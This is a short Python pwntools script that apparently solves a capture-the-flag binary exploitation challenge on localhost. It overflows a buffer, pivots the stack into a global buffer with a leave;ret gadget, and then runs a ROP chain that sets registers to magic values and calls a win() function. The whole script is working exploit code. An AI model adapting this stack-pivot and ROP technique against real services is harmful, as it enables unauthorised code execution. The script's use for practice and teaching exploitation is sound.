#!/usr/bin/env python3
import sys
import struct
from pwn import *

adrs = 'localhost'
port = 4001
proc = remote( adrs, port )

addr_msg    = 0x4040a0  # msg
addr_win    = 0x4012ab  # win()
addr_leave  = 0x4012a9  # leave  ; ret  ;
addr_rdi    = 0x40130e  # pop rdi ; ret  ;
addr_rsi_8  = 0x401313  # pop rsi ; pop r15 ; ret  ;
offset      = 0xc0

exploit_1  = b'a'*0x10
exploit_1 += struct.pack('<Q', addr_msg+offset - 8)
exploit_1 += struct.pack('<Q', addr_leave)
#sys.stdout.buffer.write(exploit_1[:-1])
print(exploit_1[:-1])
proc.send(exploit_1[:-1])

exploit_2  = b'\x00'*offset
exploit_2 += struct.pack('<QQ' , addr_rdi,   0xcafebabe)
exploit_2 += struct.pack('<QQQ', addr_rsi_8, 0xc0bebeef, 0xdeadbeef)
exploit_2 += struct.pack('<Q'  , addr_win)
#sys.stdout.buffer.write(exploit_2 + b'\n')
print(exploit_2 + b'\n')
proc.send(exploit_2 + b'\n')
